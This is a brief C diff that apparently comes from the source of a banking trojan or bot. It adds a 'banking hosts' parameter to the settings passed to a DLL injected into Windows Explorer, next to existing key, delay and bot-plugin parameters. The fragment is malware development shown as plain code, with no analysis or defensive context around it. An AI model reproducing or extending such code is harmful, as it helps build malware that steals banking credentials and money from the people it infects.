@@ -386,6 +386,7 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 		SetParam(BOT_PARAM_KEY);
 		SetParam(BOT_PARAM_DELAY);
 		SetParam(BOT_PARAM_BOTPLUGNAME);
+		SetParam(BOT_PARAM_BANKINGHOSTS);
 	}
 
 	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);
